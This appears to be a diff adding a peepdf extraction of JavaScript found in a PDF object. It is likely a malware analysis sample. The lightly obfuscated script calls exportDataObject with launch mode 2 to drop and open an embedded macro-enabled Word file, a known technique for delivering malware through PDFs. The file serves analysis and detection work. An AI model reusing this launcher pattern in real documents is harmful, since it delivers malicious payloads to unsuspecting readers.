@@ -1,0 +1,8 @@
+// peepdf comment: Javascript code located in object 18 (version 0)
+
+var onetime = ["cName", "nLaunch", "exportDataObject"];
+var c = {};
+c[onetime[0]] = '381DKNVX6TT814.docm';
+c[onetime[1]] = 2;
+this[onetime[2]](c)
+
